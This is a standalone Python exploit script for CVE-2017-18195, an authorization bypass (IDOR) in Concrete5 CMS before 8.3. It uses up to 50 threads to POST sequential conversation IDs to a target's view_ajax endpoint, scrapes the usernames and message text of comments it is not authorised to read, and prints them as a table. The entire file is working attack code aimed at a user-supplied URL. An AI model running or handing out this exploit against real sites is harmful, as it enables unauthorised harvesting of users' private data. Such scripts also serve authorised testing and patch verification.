#!/usr/bin/env python3

# Concrete5 < 8.3 vulnerable to Authorization Bypass Through User-Controlled Key (IDOR)
# CVE-2017-18195
# Chapman (R3naissance) Schleiss

from queue import Queue
from threading import Thread
from bs4 import BeautifulSoup
from tabulate import tabulate
import argparse
import requests
import logging

parser = argparse.ArgumentParser(
    description="This script attempts to enumerate all comments from a vulnerable Concrete5 CMS.",
)
parser.add_argument('-u','--url', action='store', dest='url', required=True,
					help="This is the url to attack. Typically http://example.com/index.php/tools/required/conversations/view_ajax")
parser.add_argument('-s','--start', action='store', type=int, dest='start_id',
                    help='Where to start enumeration')
parser.add_argument('-e','--end', action='store', type=int, dest='end_id',
                    help='Where to end enumeration')
parser.add_argument('-v','--verbose', action='store_true', dest='verbose',
                    help='This boolean flag will trigger all raw information to stdout')
args = parser.parse_args()

if args.verbose:
	logging.basicConfig(level=logging.DEBUG, format='[%(levelname)s] - %(threadName)s - %(message)s')
else:
	logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

if args.start_id is None:
	args.start_id = 1
if args.end_id is None:
	args.end_id = 10

def crawl(q, result):
	while not q.empty():
		work = q.get()
		logging.debug("Requesting cnvID: " + str(work))
		try:
			response = requests.post(args.url, data={'cnvID': work, 'cID': 1}, timeout=300)
			logging.debug("Requested cnvID: %s [%s]", str(work), str(response.status_code))
			if response.status_code < 400 or response.status_code > 499:
				logging.debug("Parsing html and adding comments to results list")
				soup = BeautifulSoup(response.text, 'html.parser')
				username = soup.find_all('span', {'class': 'ccm-conversation-message-username'})
				message = soup.find_all('div', {'class': 'ccm-conversation-message-body'})
				for i in range(len(username)):
					results.append((work, username[i].text.strip(), message[i].text.strip()))
			logging.info("Completed cnvID: " + str(work))
		except:
			logging.error('Error getting cnvID: ' + str(work))
		q.task_done()
	return True

q = Queue(maxsize=0)

enum = range(args.start_id, args.end_id + 1)
num_theads = min(50, len(enum))

results = []
for i in enum:
	q.put(i)

for i in range(num_theads):
	logging.debug('Starting thread ' + str(i))
	worker = Thread(target=crawl, args=(q, results), name="Thread: " + str(i))
	worker.setDaemon(True)
	worker.start()

logging.debug('Waiting for final threads to complete')
q.join()

logging.info('Enumeration complete')

print(tabulate(results, headers=('cnvID', 'username', 'message'), tablefmt='grid'))